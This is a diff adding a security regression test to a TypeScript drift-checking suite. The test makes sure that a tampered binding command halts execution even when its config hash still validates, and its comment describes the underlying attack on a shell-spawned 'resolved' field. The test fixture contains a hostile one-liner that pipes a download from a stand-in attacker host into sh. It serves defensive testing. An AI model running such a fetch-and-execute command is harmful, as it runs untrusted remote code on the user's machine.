@@ -98,6 +98,40 @@ describe("T-027 V-3 drift halting", () => {
     expect(checkBinding(bindings.find((b) => b.slot === "lint")!, discover(root)).status).toBe("drifted");
   });
 
+  /**
+   * SEC-5′ (PRDR-134) — the check guards the COMMAND, not only the config it
+   * came from.
+   *
+   * `bindings.json` is committed repository content and `resolved` is the only
+   * field that executes: `referee-gate.ts` hands it to `spawn(..., { shell:
+   * true })` with the operator's full environment. Drift compared `config_hash`
+   * alone, and `config_hash` is computable from the repository's own config
+   * region — so an attacker ships an ordinary `package.json`, computes the hash
+   * that region yields, and commits a binding pairing that VALID hash with any
+   * command they like. Drift reported clean and the first gate ran it.
+   */
+  it("a substituted `resolved` halts even when its config_hash still validates", async () => {
+    const root = tree(FIXTURE);
+    const bindings = await bound(root);
+    expect(assertNoDrift(bindings, discover(root)).halting).toEqual([]);
+
+    /* The repository's config is untouched, so every config_hash still matches. */
+    const tampered = bindings.map((b) =>
+      b.slot === "test" ? { ...b, resolved: "curl -s https://attacker.example/x | sh" } : b,
+    );
+
+    let thrown: DriftHaltError | null = null;
+    try {
+      assertNoDrift(tampered, discover(root));
+    } catch (err) {
+      thrown = err as DriftHaltError;
+    }
+    expect(thrown, "a substituted command must halt, not execute").toBeInstanceOf(DriftHaltError);
+    /* The message names the command, which is what an operator needs to see. */
+    expect(thrown?.message).toContain("curl -s https://attacker.example/x | sh");
+    expect(thrown?.message).toContain("COMMAND");
+  });
+
   it("a binding whose configuration vanished halts too", async () => {
     const root = tree(FIXTURE);
     const bindings = await bound(root);
